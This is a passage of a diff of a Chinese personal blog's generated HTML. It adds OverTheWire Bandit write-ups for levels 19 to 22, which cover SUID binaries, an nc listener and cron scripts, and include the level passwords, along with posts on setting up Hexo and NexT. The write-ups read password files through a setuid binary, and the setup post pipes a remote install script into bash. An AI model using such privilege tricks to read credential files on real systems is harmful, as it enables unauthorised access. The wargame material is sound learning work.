class="line">参考了该书中的一些[信息](https:&#x2F;&#x2F;books.google.de&#x2F;books?id&#x3D;GcHUDwAAQBAJ&amp;pg&#x3D;PT103&amp;lpg&#x3D;PT103&amp;dq&#x3D;%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E6%8B%A5%E6%9C%89+SUID%E6%9D%83%E9%99%90%EF%BC%8C%E9%82%A3%E4%B9%88%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E6%89%A7%E8%A1%8C&amp;source&#x3D;bl&amp;ots&#x3D;52MJixtuIf&amp;sig&#x3D;ACfU3U0_tsywjCHiz8Ydd85j8j2p5pNptg&amp;hl&#x3D;zh-CN&amp;sa&#x3D;X&amp;ved&#x3D;2ahUKEwiH46vfkZ_pAhXFjKQKHWGTA9gQ6AEwB3oECAkQAQ#v&#x3D;onepage&amp;q&#x3D;suid&amp;f&#x3D;false)</span><br><span class="line"></span><br><span class="line">linux允许用户给一些文件以特权, 利用这些文件可以提权做一些原本用户组无权做的事, 这是很正常的, linux一共就三个组, 就这么多了权限管理的限制, 不是所有事情都可以完美划分到这三个组, 如果linux的权利设计为100级, 那当然安全多了..</span><br><span class="line"></span><br><span class="line">转一张图,  文件权限的example![](https:&#x2F;&#x2F;ywnz.com&#x2F;uploads&#x2F;allimg&#x2F;20&#x2F;1-2003091000293H.JPG)</span><br><span class="line"></span><br><span class="line">怪不得以前最开始学linux, 总是被告诫别使用chmod 777, 原来会让红队大佬轻易改写文件. 拿到root.</span><br><span class="line"></span><br><span class="line">做题: 连接上服务器后, 发现有一个特殊的文件, 它有运行bandit20的权限:</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line">bandit19@bandit:~$ ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwsr-x--- 1 bandit20 bandit19 7296 Oct 16  2018 bandit20-do</span><br></pre></td></tr></table></figure>
+
+<p>而我之前进入/etc/bandit_pass发现必须要用bandit20的权限才可以打开密码文件, 那直接运行之</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit19@bandit:~$ ./bandit20-do cat ../../etc/bandit_pass/bandit20</span><br></pre></td></tr></table></figure>
+
+<p>GbKksEFF4yrVs6il55v6gwY5aVje5f0j</p>
+<h1 id="Bandit-20-21"><a href="#Bandit-20-21" class="headerlink" title="Bandit 20-21"></a>Bandit 20-21</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
+<p>总是看成stupid binary, 题目的描述是将进入目录里的该文件, 当成commandline argument来用:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ ls</span><br><span class="line">suconnect</span><br><span class="line">bandit20@bandit:~$ ./suconnect -p 1111</span><br><span class="line">getaddrinfo: Servname not supported for ai_socktype</span><br><span class="line">bandit20@bandit:~$ ./suconnect 1111</span><br><span class="line">Could not connect</span><br></pre></td></tr></table></figure>
+
+<p> 这题的<a href="https://medium.com/secttp/overthewire-bandit-level-20-a1af9a042c56" target="_blank" rel="noopener">思路</a>参考. 需要先打开一个读取的port, 采用nc命令, 目的是开启一个端口, 听取指定的数值GbKksEFF4yrVs6il55v6gwY5aVje5f0j, 所以必须要一直挂起来, 需要加&amp;:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j| nc -l localhost -p 1111&amp;</span><br><span class="line">[1] 19669</span><br></pre></td></tr></table></figure>
+
+<p>此时要用另外的脚本发送上述数值了, 没有用过screen, 因此重新开了一个终端口, 用ssh连接bandit20.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ ./suconnect 1111</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">Password matches, sending next password</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bandit20@bandit:~$ gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</span><br></pre></td></tr></table></figure>
+
+<p>另外一端接受到通过key:</p>
+<p>gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p>
+<h1 id="Bandit-21-22"><a href="#Bandit-21-22" class="headerlink" title="Bandit 21-22"></a>Bandit 21-22</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>A program is running automatically at regular intervals from <strong>cron</strong>, the time-based job scheduler. Look in <strong>/etc/cron.d/</strong> for the configuration and see what command is being executed.</p>
+<p>本小节练习是教学会看crontab,首先连接到服务器, 浏览一下提示的文件夹 /etc/cron.d/</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bandit21@bandit:~$ pwd</span><br><span class="line">/home/bandit21</span><br><span class="line">bandit21@bandit:~$ cd ../../etc/cron.d</span><br><span class="line">bandit21@bandit:/etc/cron.d$ ls</span><br><span class="line">atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22</span><br><span class="line">@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null</span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cron</span><br><span class="line">cronjob_bandit22.sh  cronjob_bandit24.sh  </span><br><span class="line">cronjob_bandit23.sh  crontab              </span><br><span class="line">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">bandit21@bandit:/etc/cron.d$ </span><br><span class="line"><span class="meta">#</span><span class="bash">注意上面拿到生成的是文件名, 也不是密码</span></span><br><span class="line">bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</span><br><span class="line">Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</span><br></pre></td></tr></table></figure>
+
+<p>Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/05/Kein/BlogSetup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Seven ♂">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Seven's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/05/Kein/BlogSetup/" itemprop="url">BlogSetup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-05T11:25:31+02:00">
+                2020-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blog/" itemprop="url" rel="index">
+                    <span itemprop="name">blog</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="小白博主搭博客记录"><a href="#小白博主搭博客记录" class="headerlink" title="小白博主搭博客记录"></a>小白博主搭博客记录</h1><h2 id="参考以下几个资源"><a href="#参考以下几个资源" class="headerlink" title="参考以下几个资源"></a>参考以下几个资源</h2><p><a href="https://zhuanlan.zhihu.com/p/33616481" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33616481</a><br><a href="https://zhuanlan.zhihu.com/p/35668237" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35668237</a><br><a href="https://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">https://theme-next.iissnan.com/getting-started.html</a></p>
+<p>Github+Hexo+next<br>宿主机系统: ubuntu 16.04</p>
+<ol>
+<li>第一坑, 安装Node.js的时候, ubuntu16.04不要用 apt-get 安装 nodejs</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs #这样装出来的nodejs版本特别低!与Hexo的版本不相兼容</span><br></pre></td></tr></table></figure>
+
+<p>但我不确定之后会不会改善, 如果不确定的话安装好了node.js可以用命令查看一下版本:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
+
+<p>我显示版本只有5.x.x, 而此刻最新版本是13.x.x</p>
+<p>因此我后来参考了这位<a href="https://blog.kavoori.com/2014-10-13/installing-hexo-on-ubuntu.html" target="_blank" rel="noopener">博主</a>, 安装了更高版本的node.js</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/creationix/nvm/v0.17.2/install.sh | bash</span><br><span class="line">nvm ls-remote</span><br><span class="line">nvm install V12.7.0 #装好了才看到博文, 有人提到装越新的版本越好, 因为最新版本是用v8 engine写的, 当然我也不知啥是v8, 应该是v型发动机八缸那种存在吧</span><br></pre></td></tr></table></figure>
+
+<p>低版本的hexo就会出现如下问题:</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588693622/LowVersionNode_yc2wgl.png" alt=""></p>
+<p>此时就需要安装更新的版本, 并且在使用时换成较新版的node.js, 我的node.js安装的是v12.7.0</p>
+<p>如下指令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvm list</span><br><span class="line">nvm run v12.7.0</span><br></pre></td></tr></table></figure>
+
+<p>如果要一劳永逸, 得把默认的node.js改了:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm alias default v12.7.0</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>第二坑是自己挖的, 在使用next这个主题时, 因为太菜不太懂NexT设计的关键词</li>
+</ol>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588693622/social_de-comment_nscg9b.png" alt="social_de-comment"></p>
+<p>更新社交social联系方式时, social一开始不起效, 因为被注释了, 之前一直是以为冒号输入成中文冒号了.</p>
+<p>如果注释了social, 会提示如下error:</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588694016/Screenshot_from_2020-05-05_17-53-06_wrdk5k.png" alt=""></p>
+<h2 id="网易云音乐插件导入"><a href="#网易云音乐插件导入" class="headerlink" title="网易云音乐插件导入"></a>网易云音乐插件导入</h2><p>采用的是这位大佬的<a href="https://blog.csdn.net/sunshine940326/article/details/69933696" target="_blank" rel="noopener">方法</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	&lt;div id&#x3D;&quot;music163player&quot;&gt;</span><br><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;330 height&#x3D;120 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;0&amp;id&#x3D;5004636762&amp;auto&#x3D;0&amp;height&#x3D;430&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用网易云音乐生成外链, 添加到 themes\next\layout\_macro  中的sidebar.swig中即可.</p>
+<p>##　连接购买的域名</p>
+<p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588696418/Screenshot_from_2020-05-05_18-33-26_m6s4ms.png" alt=""></p>
+<p>除了github一边需要生成外，域名方也要设置正确，上图是godaddy的ＤＮＳ处设置的．</p>
+<h2 id="最大的坑"><a href="#最大的坑" class="headerlink" title="最大的坑"></a>最大的坑</h2><p><img src="https://res.cloudinary.com/dyiwocwmp/image/upload/v1588701082/Screenshot_from_2020-05-05_19-51-09_qeogvv.png" alt=""></p>
+<p>这三个图标只要一点进去, 显示一直都是有问题, 报出的错误类似是:</p>
+<p>Cannot GET /%20/ HOME</p>
+<p>后来找到<a href="https://www.jianshu.com/p/b671e4082c13" target="_blank" rel="noopener">这篇</a>, 才发现默认clone的NexT配置文件, 在menu一览的是有bug的, 比如网站点击categories, 配置文件get的值是categories%20, 每一个get值后面都多带了空格, 因此把主题配置文件下的menu处, 改成下面即可.</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/||home</span></span><br><span class="line">  <span class="comment">#about: /about/||user</span></span><br><span class="line">  <span class="comment">#tags: /tags/||tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/||th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||archive</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/||calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml||sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/||heartbeat</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>虽然基本上整整花了一天时间, 整体跟毛坯房一样, 但是以后总算有地方可以记录了.</p>
+<h2 id="update"><a href="#update" class="headerlink" title="update:"></a>update:</h2><p>最近重新安装了操作系统，如果将原来的文件拷到blog所在文件夹，需要删除以前生成的文件，否则会出现拒绝访问。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">sudo rm -rf .deploy_git</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/05/CommandForBlog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Seven ♂">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Seven's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/05/CommandForBlog/" itemprop="url">CommandForBlog</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-05T11:25:31+02:00">
+                2020-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/blog/" itemprop="url" rel="index">
+                    <span itemprop="name">blog</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Most frequently used of hexo</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d</span><br><span class="line"><span class="meta">#</span><span class="bash">generate, server, deploy</span></span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Build a new post</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post "Hello World"</span><br></pre></td></tr></table></figure>
+
+<p>Node related</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
+
+<p>NVM related</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nvm ls-remote</span><br><span class="line">nvm install v12.7.0</span><br><span class="line">nvm list</span><br><span class="line">nvm run v12.7.0</span><br></pre></td></tr></table></figure>
+
 
           
         
@@ -2389,7 +2117,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2411,7 +2139,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
